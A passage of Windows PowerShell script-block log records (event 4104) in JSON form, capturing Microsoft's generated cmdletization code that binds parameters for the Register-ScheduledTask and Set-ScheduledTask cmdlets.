'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskSettings'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Description')) {\r\n          [object]$__cmdletization_value = ${Description}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('User')) {\r\n          [object]$__cmdletization_value = ${User}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'User'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'User'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Password')) {\r\n          [object]$__cmdletization_value = ${Password}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Password'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Password'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Action')) {\r\n          [object]$__cmdletization_value = ${Action}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Action'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Action'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskAction'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RunLevel')) {\r\n          [object]$__cmdletization_value = ${RunLevel}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RunLevel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.RunLevelEnum'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RunLevel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.RunLevelEnum'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskName')) {\r\n          [object]$__cmdletization_value = ${TaskName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('RegisterByUser', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n        { @('Xml') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Force')) {\r\n          [object]$__cmdletization_value = ${Force}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Force'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Force'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Xml')) {\r\n          [object]$__cmdletization_value = ${Xml}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Xml'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Xml'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Password')) {\r\n          [object]$__cmdletization_value = ${Password}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Password'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Password'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('User')) {\r\n          [object]$__cmdletization_value = ${User}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'User'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'User'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskPath')) {\r\n          [object]$__cmdletization_value = ${TaskPath}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskName')) {\r\n          [object]$__cmdletization_value = ${TaskName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n ",
    "ScriptBlockId": "57f72093-4163-4974-89ca-f2b6f8e7f653",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 3,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:23.413125Z"
    },
    "EventRecordID": 86,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0001-4D9F-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5908,
      "ThreadID": 2524
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 10,
    "MessageTotal": 12,
    "ScriptBlockText": "       $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('RegisterByXml', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n    }\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP PS_ScheduledTask_v1.0.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Register-ScheduledTask' -Alias '*'\r\n        \r\n\r\nfunction Set-ScheduledTask\r\n{\r\n    [CmdletBinding(DefaultParameterSetName='User', PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask')][OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask')][OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask')]\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Object', Mandatory=$true, Position=0, ValueFromPipeline=$true)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance]\r\n    ${InputObject},\r\n\r\n    [Parameter(ParameterSetName='Object', Position=1)]\r\n    [Parameter(ParameterSetName='User', Position=6)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${Password},\r\n\r\n    [Parameter(ParameterSetName='Object', Position=2)]\r\n    [Parameter(ParameterSetName='User', Position=5)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${User},\r\n\r\n    [Parameter(ParameterSetName='Principal', Position=5)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskPrincipal')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance]\r\n    ${Principal},\r\n\r\n    [Parameter(ParameterSetName='Principal', Position=2)]\r\n    [Parameter(ParameterSetName='User', Position=2)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskAction')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance[]]\r\n    ${Action},\r\n\r\n    [Parameter(ParameterSetName='Principal', Position=1)]\r\n    [Parameter(ParameterSetName='User', Position=1)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${TaskPath},\r\n\r\n    [Parameter(ParameterSetName='Principal', Position=4)]\r\n    [Parameter(ParameterSetName='User', Position=4)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskSettings')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance]\r\n    ${Settings},\r\n\r\n    [Parameter(ParameterSetName='Principal', Position=3)]\r\n    [Parameter(ParameterSetName='User', Position=3)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskTrigger')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance[]]\r\n    ${Trigger},\r\n\r\n    [Parameter(ParameterSetName='Principal', Mandatory=$true, Position=0)]\r\n    [Parameter(ParameterSetName='User', Mandatory=$true, Position=0)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${TaskName},\r\n\r\n    [Parameter(ParameterSetName='Object')]\r\n    [Parameter(ParameterSetName='Principal')]\r\n    [Parameter(ParameterSetName='User')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Object')]\r\n    [Parameter(ParameterSetName='Principal')]\r\n    [Parameter(ParameterSetName='User')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Object')]\r\n    [Parameter(ParameterSetName='Principal')]\r\n    [Parameter(ParameterSetName='User')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n      switch -exact ($PSCmdlet.ParameterSetName) { \r\n        { @('Object') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('InputObject')) {\r\n          [object]$__cmdletization_value = ${InputObject}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InputObject'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InputObject'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Password')) {\r\n          [object]$__cmdletization_value = ${Password}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Password'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Password'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('User')) {\r\n          [object]$__cmdletization_value = ${User}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'User'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'User'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('SetByObject', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n        { @('Principal') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Principal')) {\r\n          [object]$__cmdletization_value = ${Principal}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Principal'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Principal'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskPrincipal'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Action')) {\r\n          [object]$__cmdletization_value = ${Action}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Action'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Action'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskAction'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskPath')) {\r\n          [object]$__cmdletization_value = ${TaskPath}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Settings')) {\r\n          [object]$__cmdletization_value = ${Settings}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Settings'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Settings'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskSettings'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Trigger')) {\r\n          [object]$__cmdletization_value = ${Trigger}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Trigger'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Trigger'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskTrigger'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskName')) {\r\n          [object]$__cmdletization_value = ${TaskName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('SetByPrincipal', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n        { @('User') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Action')) {\r\n          [object]$__cmdletization_value = ${Action}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Action'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = 